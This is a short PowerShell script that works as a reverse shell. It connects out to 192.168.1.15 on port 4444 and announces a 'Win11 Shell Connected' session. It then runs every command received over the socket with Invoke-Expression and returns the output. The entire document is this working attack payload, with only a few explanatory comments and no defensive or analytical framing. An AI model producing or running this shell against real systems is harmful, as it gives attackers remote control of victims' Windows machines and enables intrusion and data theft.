$client = New-Object System.Net.Sockets.TCPClient('192.168.1.15', 4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}

# This sends a "Connected" message so you know it worked
$sendbyte = ([text.encoding]::ASCII).GetBytes("--- Win11 Shell Connected ---`nPS " + (pwd).Path + "> ")
$stream.Write($sendbyte,0,$sendbyte.Length)

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    # Execute command and catch errors
    try {
        $sendback = (IEX $data 2>&1 | Out-String )
    } catch {
        $sendback = $_.Exception.Message
    }
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
